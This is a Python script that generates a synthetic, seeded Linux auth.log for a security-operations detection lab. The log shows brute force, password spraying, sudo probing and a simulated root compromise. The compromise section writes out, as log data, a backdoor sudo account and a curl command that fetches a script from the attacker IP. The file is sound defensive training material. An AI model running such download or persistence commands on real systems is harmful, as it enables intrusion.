#!/usr/bin/env python3
"""
make_lab_data.py — generates a SANITIZED, SYNTHETIC Linux auth.log for the lab.

No real hosts, users or IPs. RFC-5737 documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) are used so nothing here can point at a
real system. Deterministic (seeded) so every reviewer gets the same file.

Run:  python3 make_lab_data.py  -> writes ./auth.log
"""
import random
from datetime import datetime, timedelta

random.seed(20260914)
HOST = "soc-lab-01"
START = datetime(2026, 9, 13, 22, 0, 0)

lines = []
pid = 4100


def ts(dt):
    return dt.strftime("%b %d %H:%M:%S")


def emit(dt, proc, msg):
    global pid
    pid += random.randint(1, 4)
    lines.append(f"{ts(dt)} {HOST} {proc}[{pid}]: {msg}")


# 1) Normal daytime activity (baseline)
t = START
normal_users = ["priya", "arjun", "deploy", "ops"]
for i in range(18):
    t += timedelta(minutes=random.randint(3, 20))
    u = random.choice(normal_users)
    ip = f"192.0.2.{random.randint(10, 60)}"
    emit(t, "sshd", f"Accepted publickey for {u} from {ip} port {random.randint(40000, 60000)} ssh2: RSA SHA256:LabKey{u}")
    emit(t + timedelta(seconds=1), "sshd", f"pam_unix(sshd:session): session opened for user {u} by (uid=0)")
    if random.random() < 0.3:
        emit(t + timedelta(minutes=1), "sudo", f"    {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/systemctl status nginx")

# 2) SSH brute force from one IP against root (classic)
t = START + timedelta(hours=2, minutes=5)   # 00:05 — off-hours
bf_ip = "203.0.113.45"
for i in range(37):
    t += timedelta(seconds=random.randint(1, 4))
    if i % 5 == 0:
        emit(t, "sshd", f"Invalid user admin from {bf_ip} port {50000+i}")
        emit(t, "sshd", f"Failed password for invalid user admin from {bf_ip} port {50000+i} ssh2")
    else:
        emit(t, "sshd", f"Failed password for root from {bf_ip} port {50000+i} ssh2")
# brute force ends with a SUCCESS  -> the critical finding
t += timedelta(seconds=3)
emit(t, "sshd", f"Accepted password for root from {bf_ip} port 50099 ssh2")
emit(t + timedelta(seconds=1), "sshd", "pam_unix(sshd:session): session opened for user root by (uid=0)")
# post-compromise actions
t += timedelta(minutes=2)
emit(t, "useradd", "new user: name=svc_backup, UID=1007, GID=1007, home=/home/svc_backup, shell=/bin/bash")
emit(t + timedelta(seconds=20), "usermod", "add 'svc_backup' to group 'sudo'")
emit(t + timedelta(minutes=1), "sudo", "    root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh")

# 3) Password spraying: one IP, ONE password attempt each against MANY users
t = START + timedelta(hours=3, minutes=40)
spray_ip = "198.51.100.77"
spray_users = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
               "ivan", "judy", "mallory", "oscar", "peggy", "trent", "victor", "walter"]
for u in spray_users:
    t += timedelta(seconds=random.randint(20, 45))
    emit(t, "sshd", f"Invalid user {u} from {spray_ip} port {random.randint(40000, 60000)}")
    emit(t, "sshd", f"Failed password for invalid user {u} from {spray_ip} port {random.randint(40000, 60000)} ssh2")

# 4) Legit user with a couple of typos (should NOT be flagged as brute force)
t = START + timedelta(hours=10, minutes=15)
emit(t, "sshd", "Failed password for priya from 192.0.2.14 port 51234 ssh2")
emit(t + timedelta(seconds=9), "sshd", "Failed password for priya from 192.0.2.14 port 51235 ssh2")
emit(t + timedelta(seconds=18), "sshd", "Accepted password for priya from 192.0.2.14 port 51236 ssh2")

# 5) Failed sudo attempts by a normal user (privilege escalation probing)
t = START + timedelta(hours=11)
for i in range(4):
    t += timedelta(seconds=15)
    emit(t, "sudo", "    arjun : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/arjun ; USER=root ; COMMAND=/bin/cat /etc/shadow")

# 6) su to root from a non-admin account
t = START + timedelta(hours=11, minutes=30)
emit(t, "su", "(to root) arjun on pts/1")
emit(t, "su", "pam_unix(su:auth): authentication failure; logname=arjun uid=1002 euid=0 tty=pts/1 ruser=arjun rhost=  user=root")

# 7) Trailing normal traffic
t = START + timedelta(hours=12)
for i in range(6):
    t += timedelta(minutes=random.randint(5, 25))
    u = random.choice(normal_users)
    emit(t, "sshd", f"Accepted publickey for {u} from 192.0.2.{random.randint(10, 60)} port {random.randint(40000, 60000)} ssh2: RSA SHA256:LabKey{u}")

lines.sort(key=lambda l: datetime.strptime("2026 " + l[:15], "%Y %b %d %H:%M:%S"))
with open("auth.log", "w") as f:
    f.write("\n".join(lines) + "\n")
print(f"wrote auth.log with {len(lines)} lines")
